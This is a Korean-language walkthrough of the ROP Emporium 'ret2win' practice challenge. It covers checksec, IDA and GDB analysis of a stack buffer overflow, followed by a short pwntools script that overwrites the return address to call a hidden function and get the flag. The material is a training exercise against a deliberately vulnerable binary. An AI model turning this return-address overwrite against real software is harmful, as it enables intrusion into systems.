# ROP Emporium ret2win 문제 풀이

### checksec

![image](https://user-images.githubusercontent.com/59410565/119958818-5be03f80-bfde-11eb-8fb3-dd13f25ee197.png)

64bit 파일이고, Partial RELRO와 NX가 적용되어 있따. 따라서 ROP로 우회하여 공격할 수 있을 것 같다.



### IDA

> main() 함수

![image](https://user-images.githubusercontent.com/59410565/119959153-afeb2400-bfde-11eb-9c29-2137c5f484f0.png)

setvbuf() 함수가 존재한다. "ret2win by ROP Emporium", "x86_64"를 출력하고 pwnme()를 호출한다.

> pwnme() 함수

![image](https://user-images.githubusercontent.com/59410565/119959328-df9a2c00-bfde-11eb-8457-9448126ad8cb.png)

-> pwnme() 함수는 인자를 전달 받지 않는다....? 앞에 main에서는 왜 전달해 준 것일까...?

puts()에 작성되어 있는 문자들을 살펴본 결과 56bytes를 입력받는 것 같다. 이때 buf의 크기인 32bytes보다 더 많이 입력받기 때문에 overflow가 발생한다.

> ret2win() 함수

![image](https://user-images.githubusercontent.com/59410565/119959633-22f49a80-bfdf-11eb-8bbf-b891f36ebe0c.png)

main과 pwnme 어디에도 ret2win을 호출하는 것이 없다. 즉, 코드의 흐름을 변경하여 ret2win이 실행되도록 해야한다.



### GDB

![image](https://user-images.githubusercontent.com/59410565/120013916-5b669980-c01c-11eb-9e6d-ea6bd492eee1.png)

![image](https://user-images.githubusercontent.com/59410565/120013703-09be0f00-c01c-11eb-96fa-b77c4b2da79c.png)

**[Break Point]**

- pwnme+0 : pwnme() 함수 코드 첫 부분
- pwnme+92 : read() 함수 호출 전

![image](https://user-images.githubusercontent.com/59410565/120014123-a1236200-c01c-11eb-8dc7-b988888031e3.png)

![image](https://user-images.githubusercontent.com/59410565/120014415-fbbcbe00-c01c-11eb-8cce-0ddc6d140143.png)

40개 이상의 문자를 입력하면 RET이 변조된다.



## Exploit

```
payload = "A"*40 + ret2win 주소
```



### Exploit Code

```python
from pwn import *

#context.log_level = 'debug'
r = process('./ret2win')
e = ELF("./ret2win")

ret2win = e.symbols['ret2win']
print('ret2win : ' + str(hex(ret2win)))

payload = "A"*40
payload += p64(ret2win)

r.send(payload)
r.interactive()
```



### Result

![image](https://user-images.githubusercontent.com/59410565/120018197-c797cc00-c021-11eb-8455-ff0752bbc8b9.png)

flag를 얻을 수 있었다.

------


